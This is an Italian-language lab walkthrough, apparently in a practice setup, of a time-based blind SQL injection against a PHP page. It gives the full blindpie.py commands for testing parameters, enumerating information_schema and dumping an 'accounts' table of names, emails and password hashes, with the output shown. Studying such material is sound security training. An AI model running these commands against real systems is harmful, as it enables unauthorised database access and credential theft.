# Time-Based Blind Escaped

1. Esamino i parametri della richiesta POST:

    ```
    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post test --test
    ```

    Lo script rileva che `email` sia vulnerabile.

2. Ottengo le prime righe di `information_schema.tables`:

    ```
    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T10 attack --table information_schema.tables --column table_name --param to --row 0 --rows 120
    ```

    Tra le righe compare la tabella `accounts`.

3. Ottengo le prime righe di `information_schema.columns`:

    ```
    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T5 attack --table information_schema.columns --column "concat(table_name, char(32), column_name)" --param to --row 0 --rows 50
    ```

    Nota: char(32) corrisponde al carattere 'spazio'.

    Ogni riga ritornata dallo script è una coppia `(table_name, column_name)`. Cercando le righe in cui compare la tabella `accounts` si determinano i nomi delle sue colonne.

4.  Estraggo tutti i dati della `accounts`:

    ```
    $ python3 blindpie.py -u http://192.168.0.104/sqli/time_based_blind_escaped.php -p to msg -d 1 message --post -M0 -T10 attack --table accounts --column "concat(id, char(32), first_name, char(32), last_name, char(32), email, char(32), password)" --param to --row 0 --rows 10
    ```

    Output:

    ```
    ...
    > RESULTS:
    1 Arthur Dent arthur@guide.com d00ee262cdcbe7543210bb85f6f1cac257b4e994
    2 Ford Prefect ford@guide.com 30f5cc99c17426a0d28acf8905c6d776039ad022
    3 Tricia McMillan tricia@guide.com bcb3358e273b5772ee0ae1799b612e13cc726b04
    4 Zaphod Beeblebrox zaphod@guide.com 0c38530eaca4dbc0f49c459c0c52b362f14215c3
    ...
    ```
